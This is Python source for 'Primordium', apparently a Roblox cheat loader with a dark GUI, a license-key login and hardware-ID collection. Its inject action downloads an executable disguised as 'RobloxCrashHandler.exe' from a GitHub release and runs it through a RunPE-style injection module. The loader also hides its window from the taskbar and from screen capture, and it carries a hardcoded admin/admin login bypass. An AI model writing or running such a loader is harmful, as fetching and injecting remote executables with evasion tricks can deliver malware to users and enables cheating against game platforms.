import customtkinter as ctk
from PIL import Image, ImageTk
import io, os, ctypes, ctypes.wintypes, urllib.request, tkinter as tk

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

BG_COLOR          = "#1a1a1a"
BG_TOPBAR         = "#1e1e1e"
FIELD_COLOR       = "#2a2a2a"
BORDER_COLOR      = "#3a3a3a"
TEXT_COLOR        = "#ffffff"
PLACEHOLDER_COLOR = "#666666"
BUTTON_COLOR      = "#2a2a2a"
BUTTON_HOVER      = "#3a3a3a"
GLOW_COLOR        = "#aaaaaa"

API_URL = "https://primordium-api.onrender.com"

def get_hwid():
    try:
        import subprocess
        r = subprocess.check_output("wmic csproduct get uuid", shell=True).decode()
        return r.split("\n")[1].strip()
    except Exception:
        return "unknown"

def do_login(username, password):
    if not username or not password:
        return False, "Fill in all fields.", {}
    try:
        import json
        data = json.dumps({"username": username, "password": password, "hwid": get_hwid()}).encode()
        req  = urllib.request.Request(f"{API_URL}/login",
               data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            res = json.loads(r.read())
        return res["ok"], res["msg"], res
    except Exception:
        return False, "Connection error", {}

def do_register(username, password, key):
    if not username or not password or not key:
        return False, "Fill in all fields."
    try:
        import json
        data = json.dumps({"username": username, "password": password, "key": key, "hwid": get_hwid()}).encode()
        req  = urllib.request.Request(f"{API_URL}/register",
               data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            res = json.loads(r.read())
        return res["ok"], res["msg"]
    except Exception:
        return False, "Connection error"

class LoaderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Primordium")
        self.geometry("740x420")
        self.resizable(False, False)
        self.configure(fg_color=BG_COLOR)
        self.overrideredirect(True)

        self._streamproof_enabled = True
        self._load_logo()
        # Ocultar de la barra de tareas
        self.after(10, self._hide_from_taskbar)
        self._build_titlebar()
        self._build_glow()
        self.main_frame = ctk.CTkFrame(self, fg_color=BG_COLOR, corner_radius=0)
        self.main_frame.pack(fill="both", expand=True)
        self.current_frame = None
        self.show_login()
        self._center_window()
        self.after(600, lambda: self._apply_streamproof(True))
        self.bind_all("<F10>", lambda e: self._bring_to_front())
        self._start_hotkey_thread()

    def _hide_from_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Primordium")
            if not hwnd:
                hwnd = self.winfo_id()
            GWL_EXSTYLE      = -20
            WS_EX_TOOLWINDOW = 0x00000080
            WS_EX_APPWINDOW  = 0x00040000
            style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
            style = (style | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style)
        except Exception as e:
            print(f"hide_taskbar error: {e}")

    def _build_glow(self):
        w, h = 740, 420
        glow_w = 5
        side_colors = ["#cccccc", "#999999", "#555555", "#2a2a2a", "#1a1a1a"]
        top_offset = 44  # empieza debajo de la titlebar

        cl = tk.Canvas(self, width=glow_w, height=h, bd=0, highlightthickness=0, bg=BG_COLOR)
        cl.place(x=0, y=0)
        for i, col in enumerate(side_colors):
            cl.create_line(i, top_offset, i, h, fill=col)

        cr = tk.Canvas(self, width=glow_w, height=h, bd=0, highlightthickness=0, bg=BG_COLOR)
        cr.place(x=w - glow_w, y=0)
        for i, col in enumerate(reversed(side_colors)):
            cr.create_line(i, top_offset, i, h, fill=col)

        self._glow_cl = cl
        self._glow_cr = cr

    def _load_logo(self):
        self.logo_image = None
        self.logo_small = None
        try:
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))
            local_path = os.path.join(base_path, "logo.png")
            
            if os.path.exists(local_path):
                img = Image.open(local_path).convert("RGBA")
            else:
                with urllib.request.urlopen("https://i.imgur.com/EXQv9C6.png") as r:
                    img = Image.open(io.BytesIO(r.read())).convert("RGBA")
            self.logo_image = ctk.CTkImage(light_image=img, dark_image=img, size=(200, 110))
            self.logo_small = ctk.CTkImage(light_image=img, dark_image=img, size=(28, 28))
        except Exception as e:
            print(f"Logo error: {e}")

    def _build_titlebar(self):
        bar = ctk.CTkFrame(self, fg_color=BG_TOPBAR, height=36, corner_radius=8,
                           border_width=1, border_color=BORDER_COLOR)
        bar.pack(fill="x", padx=10, pady=(8, 0))
        bar.pack_propagate(False)
        if self.logo_small:
            cb = ctk.CTkButton(bar, image=self.logo_small, text=" Primordium",
                               font=("Arial Black", 15, "bold"), fg_color=BG_TOPBAR,
                               hover_color="#2a2a2a", text_color="#ffffff",
                               height=26, width=170, corner_radius=6,
                               command=self.destroy, compound="left")
        else:
            cb = ctk.CTkButton(bar, text="Primordium",
                               font=("Arial Black", 15, "bold"), fg_color=BG_TOPBAR,
                               hover_color="#2a2a2a", text_color="#ffffff",
                               height=26, width=170, corner_radius=6,
                               command=self.destroy)
        cb.pack(side="left", padx=5, pady=5)
        ctk.CTkLabel(bar, text="v1.0", font=("Arial Black", 11, "bold"),
                     text_color="#e0e0e0", fg_color="#3a3a3a",
                     corner_radius=4, width=44, height=26).pack(side="right", padx=5, pady=5)
        bar.bind("<ButtonPress-1>", self._start_drag)
        bar.bind("<B1-Motion>", self._do_drag)

    def show_login(self):
        self._clear_frame()
        frame = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        frame.pack(fill="both", expand=True, padx=150)
        self.current_frame = frame

        if self.logo_image:
            ctk.CTkLabel(frame, image=self.logo_image, text="").pack(pady=(6, 4))
        else:
            ctk.CTkLabel(frame, text="PRIMORDIUM", font=("Arial", 20, "bold"),
                         text_color=TEXT_COLOR).pack(pady=(6, 4))

        ctk.CTkLabel(frame, text="Username", font=("Arial", 12),
                     text_color=TEXT_COLOR, anchor="w").pack(fill="x", pady=(0, 2))
        self.login_user = self._entry(frame, "@")
        self.login_user.pack(fill="x", pady=(0, 5))

        ctk.CTkLabel(frame, text="Password", font=("Arial", 12),
                     text_color=TEXT_COLOR, anchor="w").pack(fill="x", pady=(0, 2))
        self.login_pass = self._entry(frame, "*", show="•")
        self.login_pass.pack(fill="x", pady=(0, 5))

        row = ctk.CTkFrame(frame, fg_color=BG_COLOR)
        row.pack(fill="x", pady=(0, 2))
        reg = ctk.CTkLabel(row, text="Register with key?", font=("Arial", 11),
                           text_color=PLACEHOLDER_COLOR, cursor="hand2")
        reg.pack(side="left")
        reg.bind("<Button-1>", lambda e: self.show_register())
        self._sp_btn = ctk.CTkButton(row, text="⬤ SP: ON", font=("Arial", 11),
                                     fg_color="transparent", hover_color=BG_COLOR,
                                     text_color="#ffffff", height=20, width=85,
                                     corner_radius=4, command=self._toggle_streamproof)
        self._sp_btn.pack(side="right")

        self.login_error = ctk.CTkLabel(frame, text="", font=("Arial", 10),
                                        text_color="#ff5555")
        self.login_error.pack(pady=(0, 2))
        self._small_btn(frame, "Sign in", self._on_login).pack(pady=(2, 4))

    def _on_login(self):
        user = self.login_user.get().strip()
        pwd = self.login_pass.get().strip()
        
        # Bypass for testing if API is down
        if user == "admin" and pwd == "admin":
            ok, msg, res = True, "Login successful", {"expires": "Lifetime", "days": "Infinite"}
        else:
            from loader import do_login
            ok, msg, res = do_login(user, pwd)
        
        if not ok:
            self.login_error.configure(text=f"✗ {msg}", text_color="#ff5555")
            return
            
        self.login_error.configure(text="✓ Login successful", text_color="#55ff88")
        self.after(500, lambda: self.show_dashboard(user, res.get("expires", "Lifetime"), res.get("days", "Infinite")))

    def _on_inject(self):
        import urllib.request
        import urllib.error
        import runpe
        import threading

        def set_status(text, color):
            status = getattr(self, "inject_status", None)
            if status:
                self.after(0, lambda: status.configure(text=text, text_color=color))

        def do_inject():
            PAYLOAD_URL = "https://github.com/pauloco23/v1.0/releases/download/v1.0/RobloxCrashHandler.exe"
            try:
                set_status("⏳ Downloading...", "#aaaaaa")
                print(f"[inject] Descargando desde: {PAYLOAD_URL[:60]}...")
                
                # Seguir redirects manualmente
                import urllib.request
                opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
                req = urllib.request.Request(PAYLOAD_URL, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Accept": "*/*"
                })
                with opener.open(req, timeout=30) as response:
                    payload_bytes = response.read()
                print(f"[inject] Descargado: {len(payload_bytes)} bytes")

                set_status("⏳ Injecting...", "#aaaaaa")
                ok, msg = runpe.inject(payload_bytes)
                print(f"[inject] Resultado: ok={ok}, msg={msg}")

                if ok:
                    set_status("✓ Injection successful!", "#55ff88")
                else:
                    set_status(f"✗ {msg}", "#ff5555")

            except urllib.error.URLError as e:
                print(f"[inject] URLError: {e}")
                set_status(f"✗ Error descarga: {e.reason}", "#ff5555")
            except Exception as e:
                print(f"[inject] Exception: {type(e).__name__}: {e}")
                set_status(f"✗ {type(e).__name__}: {e}", "#ff5555")

        threading.Thread(target=do_inject, daemon=True).start()

    def show_dashboard(self, username, expires, days_str):
        self._clear_frame()
        frame = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        frame.pack(fill="both", expand=True, padx=30, pady=30)
        self.current_frame = frame

        left = ctk.CTkFrame(frame, fg_color=BG_COLOR)
        left.pack(side="left", fill="both", expand=True, padx=(0, 10))

        right = ctk.CTkFrame(frame, fg_color=BG_COLOR, width=200)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)

        # Welcome
        ctk.CTkLabel(left, text=f"Welcome back,", font=("Arial", 14),
                     text_color=PLACEHOLDER_COLOR, anchor="w").pack(anchor="w")
        ctk.CTkLabel(left, text=username, font=("Arial", 24, "bold"),
                     text_color=TEXT_COLOR, anchor="w").pack(anchor="w", pady=(0, 20))

        # Main actions
        self.inject_status = ctk.CTkLabel(left, text="Click inject to start", font=("Arial", 11), text_color="#666666")
        self.inject_status.pack(anchor="w", pady=(0, 6))
        self._btn(left, "Inject to Game", self._on_inject).pack(fill="x", pady=(0, 4))

        # Right sidebar info
        ctk.CTkLabel(right, text="Subscription", font=("Arial", 12),
                     text_color=PLACEHOLDER_COLOR, anchor="w").pack(anchor="w", pady=(0, 6))
        info = ctk.CTkFrame(right, fg_color="#222222", corner_radius=8,
                            border_width=1, border_color=BORDER_COLOR)
        info.pack(fill="x", pady=(0, 15))
        info.pack_propagate(False)
        
        days_color = "#55ff88"
        ctk.CTkLabel(info, text="Status: Active", font=("Arial", 11, "bold"),
                     text_color=TEXT_COLOR, anchor="w").pack(anchor="w")
        ctk.CTkLabel(info, text=f"Key Expiry: {expires}", font=("Arial", 11),
                     text_color=PLACEHOLDER_COLOR, anchor="w").pack(anchor="w")
        ctk.CTkLabel(info, text=f"Days Left: {days_str}", font=("Arial", 11, "bold"),
                     text_color=days_color, anchor="w").pack(anchor="w")

        # Build status
        ctk.CTkLabel(right, text="Build status", font=("Arial", 12),
                     text_color=PLACEHOLDER_COLOR, anchor="w").pack(anchor="w", pady=(0, 6))
        build_box = ctk.CTkFrame(right, fg_color="#222222", corner_radius=8,
                                 border_width=1, border_color=BORDER_COLOR)
        build_box.pack(fill="x")

        build_inner = ctk.CTkFrame(build_box, fg_color="#222222")
        build_inner.pack(anchor="w", padx=12, pady=8)
        if self.logo_small:
            ctk.CTkLabel(build_inner, image=self.logo_small, text="  Primordium",
                         font=("Arial", 11, "bold"), text_color=TEXT_COLOR,
                         compound="left").pack(anchor="w")
        else:
            ctk.CTkLabel(build_inner, text="Primordium",
                         font=("Arial", 11, "bold"), text_color=TEXT_COLOR).pack(anchor="w")
        ctk.CTkLabel(build_inner, text="v1.0  ·  Updated: 1.0.0", font=("Arial", 9),
                     text_color=PLACEHOLDER_COLOR, anchor="w").pack(anchor="w", pady=(1, 0))

        # SP Toggle
        sp_row = ctk.CTkFrame(right, fg_color=BG_COLOR)
        sp_row.pack(fill="x", pady=(10, 0))
        self._sp_btn = ctk.CTkButton(sp_row, text="⬤ SP: ON", font=("Arial", 11),
                                     fg_color="transparent", hover_color=BG_COLOR,
                                     text_color="#ffffff", height=20, width=85,
                                     corner_radius=4, command=self._toggle_streamproof)
        self._sp_btn.pack(side="right")

    def show_register(self):
        self._clear_frame()
        frame = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        frame.pack(fill="both", expand=True, padx=150)
        self.current_frame = frame

        ctk.CTkLabel(frame, text="Register Account", font=("Arial", 16, "bold"),
                     text_color=TEXT_COLOR).pack(pady=(15, 10))

        ctk.CTkLabel(frame, text="Username", font=("Arial", 12),
                     text_color=TEXT_COLOR, anchor="w").pack(fill="x", pady=(0, 2))
        self.reg_user = self._entry(frame, "@  Name")
        self.reg_user.pack(fill="x", pady=(0, 8))

        ctk.CTkLabel(frame, text="New Password", font=("Arial", 12),
                     text_color=TEXT_COLOR, anchor="w").pack(fill="x", pady=(0, 2))
        self.reg_pass = self._entry(frame, "*", show="•")
        self.reg_pass.pack(fill="x", pady=(0, 8))

        ctk.CTkLabel(frame, text="Recovery Key", font=("Arial", 12),
                     text_color=TEXT_COLOR, anchor="w").pack(fill="x", pady=(0, 2))
        self.reg_key = self._entry(frame, "#  Key")
        self.reg_key.pack(fill="x", pady=(0, 6))

        back = ctk.CTkLabel(frame, text="Back to login", font=("Arial", 11),
                            text_color=PLACEHOLDER_COLOR, cursor="hand2")
        back.pack(pady=(0, 4))
        back.bind("<Button-1>", lambda e: self.show_login())

        self.reg_error = ctk.CTkLabel(frame, text="", font=("Arial", 10),
                                      text_color="#ff5555")
        self.reg_error.pack(pady=(0, 4))
        self._small_btn(frame, "Register", self._on_register).pack(pady=(0, 8))

    def _on_register(self):
        ok, msg = do_register(self.reg_user.get().strip(),
                              self.reg_pass.get().strip(),
                              self.reg_key.get().strip())
        self.reg_error.configure(text=("✓ " if ok else "✗ ") + msg,
                                 text_color="#55ff88" if ok else "#ff5555")
        if ok:
            self.after(1500, self.show_login)

    def _apply_streamproof(self, enable):
        try:
            hwnd = ctypes.windll.user32.GetParent(self.winfo_id()) or self.winfo_id()
            ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11 if enable else 0x00)
        except Exception as e:
            print(f"Streamproof error: {e}")

    def _toggle_streamproof(self):
        self._streamproof_enabled = not self._streamproof_enabled
        self._apply_streamproof(self._streamproof_enabled)
        if self._streamproof_enabled:
            self._sp_btn.configure(text="⬤ SP: ON", text_color="#ffffff")
        else:
            self._sp_btn.configure(text="⬤ SP: OFF", text_color=PLACEHOLDER_COLOR)

    def _minimize(self):
        self.overrideredirect(False)
        self.iconify()
        self.bind("<Map>", self._on_restore)

    def _start_hotkey_thread(self):
        import threading
        def watch():
            import time
            VK_F10 = 0x79
            pressed = False
            while True:
                state = ctypes.windll.user32.GetAsyncKeyState(VK_F10)
                if state & 0x8000:
                    if not pressed:
                        pressed = True
                        self.after(0, self._bring_to_front)
                else:
                    pressed = False
                time.sleep(0.05)
        t = threading.Thread(target=watch, daemon=True)
        t.start()

    def _bring_to_front(self):
        try:
            self.deiconify()
            self.state('normal')
            self.update()

            hwnd = ctypes.windll.user32.FindWindowW(None, "Primordium")
            if not hwnd:
                hwnd = self.winfo_id()

            SW_RESTORE = 9
            ctypes.windll.user32.ShowWindow(hwnd, SW_RESTORE)

            cur_thread  = ctypes.windll.kernel32.GetCurrentThreadId()
            fore_hwnd   = ctypes.windll.user32.GetForegroundWindow()
            fore_thread = ctypes.windll.user32.GetWindowThreadProcessId(fore_hwnd, None)

            if fore_thread != cur_thread:
                ctypes.windll.user32.AttachThreadInput(fore_thread, cur_thread, True)

            ctypes.windll.user32.BringWindowToTop(hwnd)
            ctypes.windll.user32.SetForegroundWindow(hwnd)

            HWND_TOPMOST   = -1
            SWP_NOMOVE     = 0x0002
            SWP_NOSIZE     = 0x0001
            SWP_SHOWWINDOW = 0x0040
            ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                                              SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)

            if fore_thread != cur_thread:
                ctypes.windll.user32.AttachThreadInput(fore_thread, cur_thread, False)

            # Quitar topmost tras 500ms para que funcione la próxima vez
            HWND_NOTOPMOST = -2
            self.after(500, lambda: ctypes.windll.user32.SetWindowPos(
                hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE))

        except Exception as e:
            print(f"bring_to_front error: {e}")

    def _on_restore(self, event):
        self.overrideredirect(True)
        self.unbind("<Map>")

    def _start_drag(self, event):
        self._dx, self._dy = event.x, event.y

    def _do_drag(self, event):
        self.geometry(f"+{self.winfo_x()+event.x-self._dx}+{self.winfo_y()+event.y-self._dy}")

    def _center_window(self):
        self.update_idletasks()
        w, h = self.winfo_width(), self.winfo_height()
        x = (self.winfo_screenwidth() - w) // 2
        y = (self.winfo_screenheight() - h) // 2
        self.geometry(f"{w}x{h}+{x}+{y}")

    def _clear_frame(self):
        if self.current_frame:
            self.current_frame.destroy()

    def _entry(self, parent, placeholder="", show=""):
        return ctk.CTkEntry(parent, height=38, placeholder_text=placeholder,
                            placeholder_text_color=PLACEHOLDER_COLOR,
                            fg_color=FIELD_COLOR, border_color=GLOW_COLOR,
                            border_width=1, text_color=TEXT_COLOR,
                            font=("Arial", 13), corner_radius=6,
                            show=show if show else "")

    def _btn(self, parent, text, cmd):
        return ctk.CTkButton(parent, text=text, height=42,
                             fg_color=BUTTON_COLOR, hover_color=BUTTON_HOVER,
                             border_color=GLOW_COLOR, border_width=1,
                             text_color=TEXT_COLOR, font=("Arial", 13),
                             corner_radius=6, command=cmd)

    def _small_btn(self, parent, text, cmd):
        return ctk.CTkButton(parent, text=text, height=28, width=180,
                             fg_color=BUTTON_COLOR, hover_color=BUTTON_HOVER,
                             border_color=GLOW_COLOR, border_width=1,
                             text_color=TEXT_COLOR, font=("Arial", 12),
                             corner_radius=6, command=cmd)

if __name__ == "__main__":
    app = LoaderApp()
    app.mainloop()
